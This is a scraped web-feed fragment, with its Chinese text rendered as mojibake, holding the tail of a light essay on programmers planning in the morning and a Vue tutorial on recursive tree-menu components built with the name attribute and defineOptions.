<h2 data-id="heading-6">ä¸æ˜¯â€œä¸å†™ä»£ç â€ï¼Œæ˜¯â€œä¸ç›²ç›®å†™ä»£ç â€</h2>
<p>æœ€åå¿…é¡»æ¾„æ¸…ä¸€ç‚¹ï¼šç¨‹åºå‘˜ä¸Šåˆä¸å†™ä»£ç ï¼Œä¸æ˜¯â€œæ‘¸é±¼â€ï¼Œè€Œæ˜¯â€œä¸ç›²ç›®å†™ä»£ç â€ã€‚</p>
<p>çœŸæ­£é«˜æ•ˆçš„ç¨‹åºå‘˜ï¼Œéƒ½æ‡‚â€œè“„åŠ›æ¯”æ‰§è¡Œæ›´é‡è¦â€â€”â€”ä¸Šåˆçš„æ¯ä¸€ä»½å‡†å¤‡ï¼Œéƒ½æ˜¯ä¸ºäº†ä¸‹åˆèƒ½æ›´ä¸“æ³¨ã€æ›´é«˜æ•ˆåœ°å†™ä»£ç ï¼Œé¿å…åšâ€œæ— ç”¨åŠŸâ€ã€‚</p>
<p>å°±åƒæˆ‘ä»¬å¸¸è¯´çš„ï¼š<strong>ç¨‹åºå‘˜çš„æ ¸å¿ƒç«äº‰åŠ›ï¼Œä¸æ˜¯â€œæ•²ä»£ç çš„é€Ÿåº¦â€ï¼Œè€Œæ˜¯â€œè§£å†³é—®é¢˜çš„æ•ˆç‡â€</strong> ã€‚ä¸Šåˆæ¢³ç†æ¸…æ¥šé—®é¢˜ï¼Œä¸‹åˆå°±èƒ½å¿«é€Ÿè§£å†³é—®é¢˜ï¼›ä¸Šåˆç›²ç›®æ•²ä»£ç ï¼Œä¸‹åˆå°±åªèƒ½åœ¨è¿”å·¥ä¸­å†…è€—ã€‚</p>
<p>æ‰€ä»¥ä¸‹æ¬¡å†çœ‹åˆ°ç¨‹åºå‘˜ä¸Šåˆå¯¹ç€å±å¹•â€œåˆ’æ°´â€ï¼Œåˆ«å†ä»¥ä¸ºä»–ä»¬æ²¡å¹²æ´»â€”â€”ä»–ä»¬å¯èƒ½æ­£åœ¨æ¢³ç†éœ€æ±‚ã€æ¨æ¼”æ–¹æ¡ˆã€å‡†å¤‡ç¯å¢ƒï¼Œä¸ºä¸‹åˆçš„â€œä»£ç å†²åˆºâ€è“„åŠ›å‘¢ï¼</p>
<p>æœ€åé€æ‰€æœ‰ç¨‹åºå‘˜ä¸€å¥æ¢—å¼çœŸç†ï¼š<strong>ä¸Šåˆä¸å†™ä»£ç ï¼Œä¸æ˜¯ä¸</strong> <strong>å†™</strong> <strong>ï¼Œæ˜¯ç¼“å†™ï¼Œæ…¢å†™ï¼Œä¼˜å†™ï¼Œæœ‰æ¬¡åºçš„å†™</strong>â€”â€”è®©æ¢³ç†å¥½çš„éœ€æ±‚å…ˆå†™ï¼Œè®©æ²¡æœ‰ä¾èµ–çš„æ¨¡å—å…ˆå†™ï¼Œè®©é¢„åˆ¤å¥½çš„é€»è¾‘å…ˆå†™ï¼Œæ‰èƒ½å…ˆå†™å¸¦åŠ¨åå†™ï¼›ä¹Ÿè¦å…·ä½“æƒ…å†µå…·ä½“å†™ï¼Œä¸Šåˆè“„åŠ›ã€ä¸‹åˆå†™ä»£ç ï¼Œä¸ç®¡æ—©å†™æ™šå†™ï¼Œèƒ½å†™å‡ºæ— bugã€é«˜å¯ç”¨çš„ä»£ç ï¼Œéƒ½æ˜¯å¥½ä»£ç ï¼</p>
<h3 data-id="heading-7">äº’åŠ¨è¯é¢˜</h3>
<p>ä½ ä¸Šåˆä¼šå†™ä»£ç å—ï¼Ÿæœ‰æ²¡æœ‰è¿‡â€œä¸Šåˆå†™ä»£ç ï¼Œä¸‹åˆå…¨åˆ æ‰â€çš„å°´å°¬ç»å†ï¼Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºåˆ†äº«ä½ çš„æ—¥å¸¸å·¥ä½œèŠ‚å¥ï½</p>
<p>å…³æ³¨æˆ‘ï¼Œåˆ†äº«æ›´å¤šç¨‹åºå‘˜æ—¥å¸¸ã€æŠ€æœ¯å¹²è´§ï¼Œå¸¦ä½ çœ‹é€ç¨‹åºå‘˜çš„â€œæ‘¸é±¼å¼é«˜æ•ˆâ€ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vueé€’å½’ç»„ä»¶å°ç¥å†™æ³•ï¼šname + templateé€’å½’ï¼Œä¸€æ¬¡æ€§åƒé€æ ‘å½¢ç»“æ„æ¸²æŸ“ï¼]]></title>    <link>https://juejin.cn/post/7602474148095262772</link>    <guid>https://juejin.cn/post/7602474148095262772</guid>    <pubDate>2026-02-04T02:51:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602474148095262772" data-draft-id="7602158221851131919" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vueé€’å½’ç»„ä»¶å°ç¥å†™æ³•ï¼šname + templateé€’å½’ï¼Œä¸€æ¬¡æ€§åƒé€æ ‘å½¢ç»“æ„æ¸²æŸ“ï¼"/> <meta itemprop="keywords" content="JavaScript,é¢è¯•,Vue.js"/> <meta itemprop="datePublished" content="2026-02-04T02:51:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="boooooooom"/> <meta itemprop="url" content="https://juejin.cn/user/3078273283917399"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vueé€’å½’ç»„ä»¶å°ç¥å†™æ³•ï¼šname + templateé€’å½’ï¼Œä¸€æ¬¡æ€§åƒé€æ ‘å½¢ç»“æ„æ¸²æŸ“ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3078273283917399/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    boooooooom
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:51:33.000Z" title="Wed Feb 04 2026 02:51:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"ğŸ‹"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"ğŸ“"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"ğŸ‘"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"ğŸ‰"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"ğŸ’"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ­£æ–‡</h2>
<h3 data-id="heading-1">ä¸€ã€å‰è¨€ï¼šä»€ä¹ˆæ—¶å€™éœ€è¦ç”¨é€’å½’ç»„ä»¶ï¼Ÿ</h3>
<p>åœ¨Vueå¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ã€Œå±‚çº§ä¸å›ºå®šã€çš„ç»“æ„æ¸²æŸ“éœ€æ±‚â€”â€”æ¯”å¦‚æ ‘å½¢èœå•ã€åˆ†ç±»åˆ—è¡¨ã€æ–‡ä»¶å¤¹å¯¼èˆªã€è¯„è®ºåµŒå¥—ç­‰ã€‚è¿™ç±»åœºæ™¯å¦‚æœç”¨å¾ªç¯åµŒå¥—å†™ï¼Œå±‚çº§è¶Šå¤šä»£ç è¶Šå†—ä½™ï¼Œç»´æŠ¤æˆæœ¬æé«˜ã€‚</p>
<p>è€Œé€’å½’ç»„ä»¶ï¼Œå°±æ˜¯è§£å†³è¿™ç±»é—®é¢˜çš„â€œæœ€ä¼˜è§£â€ã€‚å®ƒçš„æ ¸å¿ƒé€»è¾‘æ˜¯ã€Œç»„ä»¶è‡ªèº«è°ƒç”¨è‡ªèº«ã€ï¼Œè€ŒVueä¸­æœ€ç»å…¸ã€æœ€æ˜“ç”¨çš„é€’å½’å†™æ³•ï¼Œå°±æ˜¯ <strong>name+templateé€’å½’</strong>ï¼ˆæ— éœ€é¢å¤–å¼•å…¥ç»„ä»¶ï¼Œä»…é ç»„ä»¶nameå±æ€§å³å¯å®ç°è‡ªè°ƒç”¨ï¼‰ï¼Œä¹Ÿæ˜¯é¢è¯•é«˜é¢‘è€ƒç‚¹ã€‚</p>
<h3 data-id="heading-2">äºŒã€æ ¸å¿ƒåŸç†ï¼šname + templateé€’å½’ä¸ºä»€ä¹ˆèƒ½ç”Ÿæ•ˆï¼Ÿ</h3>
<p>å¾ˆå¤šæ–°æ‰‹ä¼šç–‘æƒ‘ï¼šâ€œç»„ä»¶æ€ä¹ˆèƒ½è‡ªå·±è°ƒç”¨è‡ªå·±ï¼Ÿä¸ä¼šæŠ¥é”™å—ï¼Ÿâ€ å…¶å®å…³é”®å°±ä¸¤ä¸ªç‚¹ï¼Œç†è§£åå°±èƒ½è½»æ¾ä¸Šæ‰‹ï¼š</p>
<ol>
<li><strong>nameå±æ€§çš„ä½œç”¨</strong>ï¼šVueç»„ä»¶çš„nameå±æ€§ï¼Œé™¤äº†ç”¨äºè°ƒè¯•ã€keep-aliveç¼“å­˜ï¼Œè¿˜æœ‰ä¸€ä¸ªæ ¸å¿ƒåŠŸèƒ½â€”â€”è®©ç»„ä»¶åœ¨è‡ªèº«æ¨¡æ¿ä¸­ï¼Œé€šè¿‡nameå€¼å¼•ç”¨è‡ªå·±ï¼ˆç›¸å½“äºç»„ä»¶çš„â€œè‡ªå¼•ç”¨æ ‡è¯†â€ï¼‰ã€‚</li>
<li><strong>é€’å½’ç»ˆæ­¢æ¡ä»¶</strong>ï¼šé€’å½’çš„æ ¸å¿ƒæ˜¯â€œå¾ªç¯è°ƒç”¨+ç»ˆæ­¢å‡ºå£â€ï¼Œå¦åˆ™ä¼šé™·å…¥æ— é™é€’å½’ï¼Œå¯¼è‡´é¡µé¢å´©æºƒã€‚Vueé€’å½’ç»„ä»¶ä¸­ï¼Œé€šå¸¸é€šè¿‡ã€Œåˆ¤æ–­æ•°æ®å±‚çº§æ˜¯å¦å­˜åœ¨ã€ä½œä¸ºç»ˆæ­¢æ¡ä»¶ï¼ˆæ¯”å¦‚æ²¡æœ‰å­èŠ‚ç‚¹æ—¶ï¼Œåœæ­¢è‡ªè°ƒç”¨ï¼‰ã€‚</li>
</ol>
<p>ç®€å•æ€»ç»“ï¼šç»™ç»„ä»¶å®šä¹‰name â†’ åœ¨templateä¸­ï¼Œé€šè¿‡nameå€¼è°ƒç”¨ç»„ä»¶è‡ªèº« â†’ åŠ ç»ˆæ­¢æ¡ä»¶ï¼Œé¿å…æ— é™é€’å½’ï¼Œè¿™å°±æ˜¯name+templateé€’å½’çš„å®Œæ•´é€»è¾‘ã€‚</p>
<h3 data-id="heading-3">ä¸‰ã€å®æ“æ¼”ç¤ºï¼šname + templateé€’å½’ç»å…¸æ¡ˆä¾‹ï¼ˆæ ‘å½¢èœå•ï¼‰</h3>
<p>ç»“åˆæœ€å¸¸ç”¨çš„ã€Œæ ‘å½¢èœå•ã€åœºæ™¯ï¼Œæ‰‹æŠŠæ‰‹å®ç°é€’å½’ç»„ä»¶ï¼Œä»£ç å¯ç›´æ¥å¤åˆ¶å¥—ç”¨ï¼Œé‡ç‚¹çœ‹æ³¨é‡Šç»†èŠ‚ã€‚</p>
<h4 data-id="heading-4">1. å‡†å¤‡é€’å½’æ•°æ®ï¼ˆå±‚çº§ä¸å›ºå®šï¼‰</h4>
<p>å…ˆå®šä¹‰ä¸€ä»½æ¨¡æ‹Ÿçš„æ ‘å½¢èœå•æ•°æ®ï¼Œå±‚çº§å¯ä»»æ„æ‰©å±•ï¼ˆè¿™é‡Œæ˜¯3çº§ï¼Œå®é™…å¼€å‘ä¸­å¯åŠ¨æ€è·å–ï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æ¨¡æ‹Ÿæ ‘å½¢èœå•æ•°æ®ï¼ˆå±‚çº§ä¸å›ºå®šï¼Œå¯æ— é™æ‰©å±•ï¼‰</span>
<span class="hljs-keyword">const</span> treeData = [
  {
    <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
    <span class="hljs-attr">label</span>: <span class="hljs-string">"é¦–é¡µ"</span>,
    <span class="hljs-attr">children</span>: [ <span class="hljs-comment">// å­èŠ‚ç‚¹ï¼ˆæœ‰å­èŠ‚ç‚¹åˆ™ç»§ç»­é€’å½’ï¼‰</span>
      { <span class="hljs-attr">id</span>: <span class="hljs-number">11</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">"é¦–é¡µbanner"</span>, <span class="hljs-attr">children</span>: [] },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">12</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">"é¦–é¡µå¯¼èˆª"</span>, <span class="hljs-attr">children</span>: [] }
    ]
  },
  {
    <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>,
    <span class="hljs-attr">label</span>: <span class="hljs-string">"å•†å“ç®¡ç†"</span>,
    <span class="hljs-attr">children</span>: [
      { 
        <span class="hljs-attr">id</span>: <span class="hljs-number">21</span>, 
        <span class="hljs-attr">label</span>: <span class="hljs-string">"å•†å“åˆ—è¡¨"</span>, 
        <span class="hljs-attr">children</span>: [ <span class="hljs-comment">// ä¸‰çº§å­èŠ‚ç‚¹</span>
          { <span class="hljs-attr">id</span>: <span class="hljs-number">211</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">"ä¸Šæ¶å•†å“"</span> },
          { <span class="hljs-attr">id</span>: <span class="hljs-number">212</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">"ä¸‹æ¶å•†å“"</span> }
        ] 
      },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">22</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">"å•†å“åˆ†ç±»"</span> }
    ]
  },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">"ä¸ªäººä¸­å¿ƒ"</span>, <span class="hljs-attr">children</span>: [] } <span class="hljs-comment">// æ— å­å¥³èŠ‚ç‚¹ï¼ˆç»ˆæ­¢é€’å½’ï¼‰</span>
];
</code></pre>
<h4 data-id="heading-5">2. ç¼–å†™é€’å½’ç»„ä»¶ï¼ˆname + templateæ ¸å¿ƒå†™æ³•ï¼‰</h4>
<p>ç»„ä»¶æ ¸å¿ƒï¼šå®šä¹‰nameå±æ€§ â†’ templateä¸­è‡ªè°ƒç”¨ â†’ åŠ ç»ˆæ­¢æ¡ä»¶ï¼ˆåˆ¤æ–­childrenæ˜¯å¦ä¸ºç©ºï¼‰ï¼Œåˆ†é€‰é¡¹å¼APIå’Œç»„åˆå¼APIï¼ˆ
</p><h5 data-id="heading-6">å†™æ³•1ï¼šé€‰é¡¹å¼APIï¼ˆä¼ ç»Ÿå†™æ³•ï¼Œæ˜“ç†è§£ï¼‰</h5>
<pre><code class="hljs language-ts" lang="ts">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tree-menu"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- å¾ªç¯å½“å‰å±‚çº§æ•°æ® --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in menuData"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tree-item"</span>&gt;</span>
<span class="hljs-comment">&lt;!-- æ¸²æŸ“å½“å‰èŠ‚ç‚¹å†…å®¹ --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.label }}<span class="hljs-symbol">&amp;lt;</span>/span<span class="hljs-symbol">&amp;gt;</span>
      <span class="hljs-comment">&lt;!-- é€’å½’æ ¸å¿ƒï¼šè‡ªèº«è°ƒç”¨è‡ªèº«ï¼ˆé€šè¿‡nameå€¼TreeMenuï¼‰ --&gt;</span>
      <span class="hljs-comment">&lt;!-- ç»ˆæ­¢æ¡ä»¶ï¼šåªæœ‰å½“childrenå­˜åœ¨ä¸”é•¿åº¦&gt;0æ—¶ï¼Œæ‰é€’å½’è°ƒç”¨ --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">TreeMenu</span> 
        <span class="hljs-attr">v-if</span>=<span class="hljs-string">"item.children &amp;&amp; item.children.length"</span> 
        <span class="hljs-attr">:menu-data</span>=<span class="hljs-string">"item.children"</span> 
      /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-comment">// 1. å®šä¹‰nameå±æ€§ï¼ˆå¿…é¡»ï¼Œä½œä¸ºç»„ä»¶è‡ªå¼•ç”¨æ ‡è¯†ï¼‰</span>
  <span class="hljs-attr">name</span>: <span class="hljs-string">"TreeMenu"</span>,
  <span class="hljs-comment">// 2. æ¥æ”¶çˆ¶ç»„ä»¶ä¼ é€’çš„å½“å‰å±‚çº§æ•°æ®ï¼ˆé€’å½’æ—¶ï¼Œä¼ é€’å­èŠ‚ç‚¹æ•°æ®ï¼‰</span>
  <span class="hljs-attr">props</span>: {
    <span class="hljs-attr">menuData</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-title class_">Array</span>,
      <span class="hljs-attr">default</span>: <span class="hljs-function">() =&gt;</span> []
    }
  }
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h5 data-id="heading-7">å†™æ³•2ï¼šç»„åˆå¼APIï¼ˆ<code>&lt;script setup&gt;</code>ï¼ŒVue3é¦–é€‰ï¼‰</h5>
<p>æ³¨æ„ï¼š<code>&lt;script setup&gt;</code> ä¸­ï¼Œç»„ä»¶é»˜è®¤æ²¡æœ‰nameå±æ€§ï¼Œéœ€è¦æ‰‹åŠ¨é€šè¿‡defineOptionså®šä¹‰ï¼Œå…¶ä»–é€»è¾‘å’Œé€‰é¡¹å¼APIä¸€è‡´ã€‚</p>
<pre><code class="hljs language-ts" lang="ts">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tree-menu"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in menuData"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tree-item"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.label }}<span class="hljs-symbol">&amp;lt;</span>/span<span class="hljs-symbol">&amp;gt;</span>
      <span class="hljs-comment">&lt;!-- åŒæ ·é€šè¿‡nameå€¼TreeMenuè‡ªè°ƒç”¨ --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">TreeMenu</span> 
        <span class="hljs-attr">v-if</span>=<span class="hljs-string">"item.children &amp;&amp; item.children.length"</span> 
        <span class="hljs-attr">:menu-data</span>=<span class="hljs-string">"item.children"</span> 
      /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="xml">
// Vue3 <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript"> éœ€æ‰‹åŠ¨å®šä¹‰nameï¼ˆ<span class="hljs-title class_">Vue3</span><span class="hljs-number">.3</span>+æ”¯æŒï¼‰
<span class="hljs-title function_">defineOptions</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">"TreeMenu"</span> <span class="hljs-comment">// æ ¸å¿ƒï¼šè‡ªå¼•ç”¨æ ‡è¯†</span>
});

<span class="hljs-comment">// æ¥æ”¶çˆ¶ç»„ä»¶ä¼ é€’çš„å±‚çº§æ•°æ®</span>
<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>({
  <span class="hljs-attr">menuData</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">Array</span>,
    <span class="hljs-attr">default</span>: <span class="hljs-function">() =&gt;</span> []
  }
});
</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</span></code></pre>
